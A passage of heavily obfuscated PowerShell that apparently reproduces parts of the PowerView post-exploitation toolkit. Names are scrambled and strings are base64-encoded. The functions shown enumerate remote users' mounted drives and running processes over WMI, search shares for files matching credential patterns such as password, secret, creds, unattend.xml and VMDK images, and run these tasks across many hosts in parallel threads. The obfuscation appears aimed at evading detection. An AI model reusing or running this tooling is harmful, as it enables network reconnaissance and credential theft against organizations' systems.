            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${__/=\/\__/\______}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            try {
                ${/===========\/==\} = gwmi @__/=\/\__/\______
                ${/=\___/\__/==\__/} = (${/===========\/==\}.EnumKey(${_/=\__/\/=\_/\/\_}, '')).sNames | ? { $_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAxAC0AWwAwAC0AOQBdACsALQBbADAALQA5AF0AKwAtAFsAMAAtADkAXQArAC0AWwAwAC0AOQBdACsAJAA='))) }
                ForEach (${__/==\/\/=\/\/\/=} in ${/=\___/\__/==\__/}) {
                    try {
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                            ${/=\__/\_/\__/\/\_} = __/\/=\/=\_/\/=\/= -/===\_/\_/\_/=\__ ${__/==\/\/=\/\/\/=} -Credential $Credential
                        }
                        else {
                            ${/=\__/\_/\__/\/\_} = __/\/=\/=\_/\/=\/= -/===\_/\_/\_/=\__ ${__/==\/\/=\/\/\/=}
                        }
                        ${/==\/=\/=\___/==\} = (${/===========\/==\}.EnumKey(${_/=\__/\/=\_/\/\_}, $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwAvAD0APQBcAC8AXAAvAD0AXAAvAFwALwBcAC8APQB9AFwATgBlAHQAdwBvAHIAawA='))))).sNames
                        ForEach (${_/==\___/=\/=\/\_} in ${/==\/=\/=\___/==\}) {
                            ${_/=\/\_/\_/\_____} = ${/===========\/==\}.GetStringValue(${_/=\__/\/=\_/\/\_}, $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwAvAD0APQBcAC8AXAAvAD0AXAAvAFwALwBcAC8APQB9AFwATgBlAHQAdwBvAHIAawBcACQAewBfAC8APQA9AFwAXwBfAF8ALwA9AFwALwA9AFwALwBcAF8AfQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdgBpAGQAZQByAE4AYQBtAGUA')))).sValue
                            ${/==\/\/==\/\_/==\} = ${/===========\/==\}.GetStringValue(${_/=\__/\/=\_/\/\_}, $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwAvAD0APQBcAC8AXAAvAD0AXAAvAFwALwBcAC8APQB9AFwATgBlAHQAdwBvAHIAawBcACQAewBfAC8APQA9AFwAXwBfAF8ALwA9AFwALwA9AFwALwBcAF8AfQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUABhAHQAaAA=')))).sValue
                            ${__/==\/\_/====\__} = ${/===========\/==\}.GetStringValue(${_/=\__/\/=\_/\/\_}, $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwAvAD0APQBcAC8AXAAvAD0AXAAvAFwALwBcAC8APQB9AFwATgBlAHQAdwBvAHIAawBcACQAewBfAC8APQA9AFwAXwBfAF8ALwA9AFwALwA9AFwALwBcAF8AfQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA==')))).sValue
                            if (-not ${/=\__/\_/\__/\/\_}) { ${/=\__/\_/\__/\/\_} = '' }
                            if (${/==\/\/==\/\_/==\} -and (${/==\/\/==\/\_/==\} -ne '')) {
                                ${/==\/\/\/=\_/=\/\} = New-Object PSObject
                                ${/==\/\/\/=\_/=\/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${/\_______/\/\/=\/}
                                ${/==\/\/\/=\_/=\/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) ${/=\__/\_/\__/\/\_}
                                ${/==\/\/\/=\_/=\/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAEkARAA='))) ${__/==\/\/=\/\/\/=}
                                ${/==\/\/\/=\_/=\/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByAGkAdgBlAEwAZQB0AHQAZQByAA=='))) ${_/==\___/=\/=\/\_}
                                ${/==\/\/\/=\_/=\/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdgBpAGQAZQByAE4AYQBtAGUA'))) ${_/=\/\_/\_/\_____}
                                ${/==\/\/\/=\_/=\/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUABhAHQAaAA='))) ${/==\/\/==\/\_/==\}
                                ${/==\/\/\/=\_/=\/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByAGkAdgBlAFUAcwBlAHIATgBhAG0AZQA='))) ${__/==\/\_/====\__}
                                ${/==\/\/\/=\_/=\/\}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBSAGUAZwBNAG8AdQBuAHQAZQBkAEQAcgBpAHYAZQA='))))
                                ${/==\/\/\/=\_/=\/\}
                            }
                        }
                    }
                    catch {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFIAZQBnAE0AbwB1AG4AdABlAGQARAByAGkAdgBlAF0AIABFAHIAcgBvAHIAOgAgACQAXwA=')))
                    }
                }
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFIAZQBnAE0AbwB1AG4AdABlAGQARAByAGkAdgBlAF0AIABFAHIAcgBvAHIAIABhAGMAYwBlAHMAcwBpAG4AZwAgACQAewAvAFwAXwBfAF8AXwBfAF8AXwAvAFwALwBcAC8APQBcAC8AfQAsACAAbABpAGsAZQBsAHkAIABpAG4AcwB1AGYAZgBpAGMAaQBlAG4AdAAgAHAAZQByAG0AaQBzAHMAaQBvAG4AcwAgAG8AcgAgAGYAaQByAGUAdwBhAGwAbAAgAHIAdQBsAGUAcwAgAG8AbgAgAGgAbwBzAHQAOgAgACQAXwA=')))
            }
        }
    }
}
function __/=\_/\/===\___/\ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${/=\/\/\/=\__/\_/=} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach (${/\_______/\/\/=\/} in ${/=\/\/\/=\__/\_/=}) {
            try {
                ${__/=\/\__/\______} = @{
                    'ComputerName' = ${/=\/\/\/=\__/\_/=}
                    'Class' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAF8AcAByAG8AYwBlAHMAcwA=')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${__/=\/\__/\______}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                Get-WMIobject @__/=\/\__/\______ | % {
                    ${____/=\___/==\/==} = $_.getowner();
                    ${___/=\/\_/=====\_} = New-Object PSObject
                    ${___/=\/\_/=====\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${/\_______/\/\/=\/}
                    ${___/=\/\_/=====\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBOAGEAbQBlAA=='))) $_.ProcessName
                    ${___/=\/\_/=====\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBJAEQA'))) $_.ProcessID
                    ${___/=\/\_/=====\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))) ${____/=\___/==\/==}.Domain
                    ${___/=\/\_/=====\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA='))) ${____/=\___/==\/==}.User
                    ${___/=\/\_/=====\_}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAFAAcgBvAGMAZQBzAHMA'))))
                    ${___/=\/\_/=====\_}
                }
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFAAcgBvAGMAZQBzAHMAXQAgAEUAcgByAG8AcgAgAGUAbgB1AG0AZQByAGEAdABpAG4AZwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwBlAHMAIABvAG4AIAAnACQAewAvAFwAXwBfAF8AXwBfAF8AXwAvAFwALwBcAC8APQBcAC8AfQAnACwAIABhAGMAYwBlAHMAcwAgAGwAaQBrAGUAbAB5ACAAZABlAG4AaQBlAGQAOgAgACQAXwA=')))
            }
        }
    }
}
function __/\/\_/=\__/=\___ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path = '.\',
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $Include = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBwAGEAcwBzAHcAbwByAGQAKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBzAGUAbgBzAGkAdABpAHYAZQAqAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBhAGQAbQBpAG4AKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBsAG8AZwBpAG4AKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBzAGUAYwByAGUAdAAqAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBuAGEAdAB0AGUAbgBkACoALgB4AG0AbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHYAbQBkAGsA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBjAHIAZQBkAHMAKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBjAHIAZQBkAGUAbgB0AGkAYQBsACoA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGMAbwBuAGYAaQBnAA==')))),
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastAccessTime,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastWriteTime,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CreationTime,
        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $OfficeDocs,
        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $FreshEXEs,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        ${_/=\__/=\/\__/====},
        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        ${___/=\/=\/=\___/=\},
        [Switch]
        ${__/\_/=\/\____/=\_},
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${_/\/\/\/\___/\/\/} =  @{
            'Recurse' = $True
            'ErrorAction' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA=')))
            'Include' = $Include
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBmAGYAaQBjAGUARABvAGMAcwA=')))]) {
            ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGMAbAB1AGQAZQA=')))] = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGQAbwBjAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGQAbwBjAHgA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHgAbABzAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHgAbABzAHgA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHAAcAB0AA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHAAcAB0AHgA'))))
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgByAGUAcwBoAEUAWABFAHMA')))]) {
            $LastAccessTime = (Get-Date).AddDays(-7).ToString($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBNAC8AZABkAC8AeQB5AHkAeQA='))))
            ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGMAbAB1AGQAZQA=')))] = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGUAeABlAA=='))))
        }
        ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAYwBlAA==')))] = -not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAbAB1AGQAZQBIAGkAZABkAGUAbgA=')))]
        ${/=\_/\__/\_/=\/\/} = @{}
        function ____/==\_/\__/\/\_ {
            [CmdletBinding()]Param([String]$Path)
            try {
                ${/===\_/===\_____/} = [IO.File]::OpenWrite($Path)
                ${/===\_/===\_____/}.Close()
                $True
            }
            catch {
                $False
            }
        }
    }
    PROCESS {
        ForEach (${/=\/=\_/\/===\/==} in $Path) {
            if ((${/=\/=\_/\/===\/==} -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcAFwAXAAuACoAXABcAC4AKgA=')))) -and ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))])) {
                ${__/\/\_/\_/\/==\_} = (New-Object System.Uri(${/=\/=\_/\/===\/==})).Host
                if (-not ${/=\_/\__/\_/=\/\/}[${__/\/\_/\_/\/==\_}]) {
                    _/=\____/\/\/=\__/ -/=\/\/\/=\__/\_/= ${__/\/\_/\_/\/==\_} -Credential $Credential
                    ${/=\_/\__/\_/=\/\/}[${__/\/\_/\_/\/==\_}] = $True
                }
            }
            ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA=')))] = ${/=\/=\_/\/===\/==}
            ls @_/\/\/\/\___/\/\/ | % {
                ${__/=\_/======\/\_} = $True
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAbAB1AGQAZQBGAG8AbABkAGUAcgBzAA==')))] -and ($_.PSIsContainer)) {
                    Write-Verbose "Excluding: $($_.FullName)"
                    ${__/=\_/======\/\_} = $False
                }
                if ($LastAccessTime -and ($_.LastAccessTime -lt $LastAccessTime)) {
                    ${__/=\_/======\/\_} = $False
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABXAHIAaQB0AGUAVABpAG0AZQA=')))] -and ($_.LastWriteTime -lt $LastWriteTime)) {
                    ${__/=\_/======\/\_} = $False
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGkAbwBuAFQAaQBtAGUA')))] -and ($_.CreationTime -lt $CreationTime)) {
                    ${__/=\_/======\/\_} = $False
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAFcAcgBpAHQAZQBBAGMAYwBlAHMAcwA=')))] -and (-not (____/==\_/\__/\/\_ -Path $_.FullName))) {
                    ${__/=\_/======\/\_} = $False
                }
                if (${__/=\_/======\/\_}) {
                    ${_/=\_/=\_/=====\/} = @{
                        'Path' = $_.FullName
                        'Owner' = $((Get-Acl $_.FullName).Owner)
                        'LastAccessTime' = $_.LastAccessTime
                        'LastWriteTime' = $_.LastWriteTime
                        'CreationTime' = $_.CreationTime
                        'Length' = $_.Length
                    }
                    ${/=\__/====\_/\/==} = New-Object -TypeName PSObject -Property ${_/=\_/=\_/=====\/}
                    ${/=\__/====\_/\/==}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBGAG8AdQBuAGQARgBpAGwAZQA='))))
                    ${/=\__/====\_/\/==}
                }
            }
        }
    }
    END {
        ${/=\_/\__/\_/=\/\/}.Keys | __/======\__/===\_
    }
}
function _/=\/===\__/==\/\_ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [String[]]
        ${/=\/\/\/=\__/\_/=},
        [Parameter(Position = 1, Mandatory = $True)]
        [System.Management.Automation.ScriptBlock]
        ${____/\_/==\_/==\_/},
        [Parameter(Position = 2)]
        [Hashtable]
        ${_/===\/==\_/=\_/\_},
        [Int]
        [ValidateRange(1,  100)]
        $Threads = 20,
        [Switch]
        ${__/===\_/\/==\_/=\}
    )
    BEGIN {
        ${_/==\/\/\__/===\/} = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        ${_/==\/\/\__/===\/}.ApartmentState = [System.Threading.ApartmentState]::STA
        if (-not ${__/===\_/\/==\_/=\}) {
            ${__/\_/\_/===\___/} = gv -Scope 2
            ${_/=====\_/\___/\/} = @('?',$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQByAGcAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AcwBvAGwAZQBGAGkAbABlAE4AYQBtAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGUAYwB1AHQAaQBvAG4AQwBvAG4AdABlAHgAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgBhAGwAcwBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABPAE0ARQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHAAdQB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHAAdQB0AE8AYgBqAGUAYwB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBBAGwAaQBhAHMAQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBEAHIAaQB2AGUAQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBFAHIAcgBvAHIAQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBGAHUAbgBjAHQAaQBvAG4AQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBIAGkAcwB0AG8AcgB5AEMAbwB1AG4AdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBWAGEAcgBpAGEAYgBsAGUAQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB5AEkAbgB2AG8AYwBhAHQAaQBvAG4A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgB1AGwAbAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABJAEQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEIAbwB1AG4AZABQAGEAcgBhAG0AZQB0AGUAcgBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEMAbwBtAG0AYQBuAGQAUABhAHQAaAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEMAdQBsAHQAdQByAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEQAZQBmAGEAdQBsAHQAUABhAHIAYQBtAGUAdABlAHIAVgBhAGwAdQBlAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEgATwBNAEUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAFMAYwByAGkAcAB0AFIAbwBvAHQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAFUASQBDAHUAbAB0AHUAcgBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAFYAZQByAHMAaQBvAG4AVABhAGIAbABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABXAEQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGUAbABsAEkAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AG4AYwBoAHIAbwBuAGkAegBlAGQASABhAHMAaAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAByAHUAZQA='))))
            ForEach (${/=\_/\__/==\/\_/=} in ${__/\_/\_/===\___/}) {
                if (${_/=====\_/\___/\/} -NotContains ${/=\_/\__/==\/\_/=}.Name) {
                ${_/==\/\/\__/===\/}.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList ${/=\_/\__/==\/\_/=}.name,${/=\_/\__/==\/\_/=}.Value,${/=\_/\__/==\/\_/=}.description,${/=\_/\__/==\/\_/=}.options,${/=\_/\__/==\/\_/=}.attributes))
                }
            }
            ForEach (${__/\_/\_/\/=\/\/\} in (ls Function:)) {
                ${_/==\/\/\__/===\/}.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList ${__/\_/\_/\/=\/\/\}.Name, ${__/\_/\_/\/=\/\/\}.Definition))
            }
        }
        ${_/\/=\_/\/\__/\_/} = [RunspaceFactory]::CreateRunspacePool(1, $Threads, ${_/==\/\/\__/===\/}, $Host)
        ${_/\/=\_/\/\__/\_/}.Open()
        $Method = $Null
        ForEach (${/===\_/\/\___/==\} in [PowerShell].GetMethods() | ? { $_.Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBlAGcAaQBuAEkAbgB2AG8AawBlAA=='))) }) {
            ${/=\/===\_/===\___} = ${/===\_/\/\___/==\}.GetParameters()
            if ((${/=\/===\_/===\___}.Count -eq 2) -and ${/=\/===\_/===\___}[0].Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHAAdQB0AA=='))) -and ${/=\/===\_/===\___}[1].Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwB1AHQAcAB1AHQA')))) {
                $Method = ${/===\_/\/\___/==\}.MakeGenericMethod([Object], [Object])
                break
            }
        }
        ${_/=\____/\/\____/} = @()
        ${/=\/\/\/=\__/\_/=} = ${/=\/\/\/=\__/\_/=} | ? {$_ -and $_.Trim()}
        Write-Verbose "[New-ThreadedFunction] Total number of hosts: $(${/=\/\/\/=\__/\_/=}.count)"
        if ($Threads -ge ${/=\/\/\/=\__/\_/=}.Length) {
            $Threads = ${/=\/\/\/=\__/\_/=}.Length
        }
        ${_/\_/\_/===\/\__/} = [Int](${/=\/\/\/=\__/\_/=}.Length/$Threads)
        ${___/\/=\/\___/===} = @()
        ${/==\____/===\/===} = 0
        ${__/\_/===\/=\/==\} = ${_/\_/\_/===\/\__/}
        for(${_/\/\__/=\/==\/\_} = 1; ${_/\/\__/=\/==\/\_} -le $Threads; ${_/\/\__/=\/==\/\_}++) {
            ${______/\_/\/\_/==} = New-Object System.Collections.ArrayList
            if (${_/\/\__/=\/==\/\_} -eq $Threads) {
                ${__/\_/===\/=\/==\} = ${/=\/\/\/=\__/\_/=}.Length
            }
            ${______/\_/\/\_/==}.AddRange(${/=\/\/\/=\__/\_/=}[${/==\____/===\/===}..(${__/\_/===\/=\/==\}-1)])
            ${/==\____/===\/===} += ${_/\_/\_/===\/\__/}
            ${__/\_/===\/=\/==\} += ${_/\_/\_/===\/\__/}
            ${___/\/=\/\___/===} += @(,@(${______/\_/\/\_/==}.ToArray()))
        }
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAFQAaAByAGUAYQBkAGUAZABGAHUAbgBjAHQAaQBvAG4AXQAgAFQAbwB0AGEAbAAgAG4AdQBtAGIAZQByACAAbwBmACAAdABoAHIAZQBhAGQAcwAvAHAAYQByAHQAaQB0AGkAbwBuAHMAOgAgACQAVABoAHIAZQBhAGQAcwA=')))
        ForEach (${__/=\/=\___/====\} in ${___/\/=\/\___/===}) {
            ${__/\/\_/=\__/===\} = [PowerShell]::Create()
            ${__/\/\_/=\__/===\}.runspacepool = ${_/\/=\_/\/\__/\_/}
            $Null = ${__/\/\_/=\__/===\}.AddScript(${____/\_/==\_/==\_/}).AddParameter($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))), ${__/=\/=\___/====\})
            if (${_/===\/==\_/=\_/\_}) {
                ForEach (${_/=\__/==\_/\__/\} in ${_/===\/==\_/=\_/\_}.GetEnumerator()) {
                    $Null = ${__/\/\_/=\__/===\}.AddParameter(${_/=\__/==\_/\__/\}.Name, ${_/=\__/==\_/\__/\}.Value)
                }
            }
            ${/===\______/\/==\} = New-Object Management.Automation.PSDataCollection[Object]
            ${_/=\____/\/\____/} += @{
                PS = ${__/\/\_/=\__/===\}
                Output = ${/===\______/\/==\}
                Result = $Method.Invoke(${__/\/\_/=\__/===\}, @($Null, [Management.Automation.PSDataCollection[Object]]${/===\______/\/==\}))
            }
        }
    }
    END {
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAFQAaAByAGUAYQBkAGUAZABGAHUAbgBjAHQAaQBvAG4AXQAgAFQAaAByAGUAYQBkAHMAIABlAHgAZQBjAHUAdABpAG4AZwA=')))
        Do {
            ForEach (${_/===\/====\/=\_/} in ${_/=\____/\/\____/}) {
                ${_/===\/====\/=\_/}.Output.ReadAll()
            }
            sleep -Seconds 1
        }
        While ((${_/=\____/\/\____/} | ? { -not $_.Result.IsCompleted }).Count -gt 0)
        ${_/==\/\_/\/\/\_/=} = 100
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAFQAaAByAGUAYQBkAGUAZABGAHUAbgBjAHQAaQBvAG4AXQAgAFcAYQBpAHQAaQBuAGcAIAAkAHsAXwAvAD0APQBcAC8AXABfAC8AXAAvAFwALwBcAF8ALwA9AH0AIABzAGUAYwBvAG4AZABzACAAZgBvAHIAIABmAGkAbgBhAGwAIABjAGwAZQBhAG4AdQBwAC4ALgAuAA==')))
        for (${_/\/\__/=\/==\/\_}=0; ${_/\/\__/=\/==\/\_} -lt ${_/==\/\_/\/\/\_/=}; ${_/\/\__/=\/==\/\_}++) {
            ForEach (${_/===\/====\/=\_/} in ${_/=\____/\/\____/}) {
                ${_/===\/====\/=\_/}.Output.ReadAll()
                ${_/===\/====\/=\_/}.PS.Dispose()
            }
            sleep -S 1
        }
        ${_/\/=\_/\/\__/\_/}.Dispose()
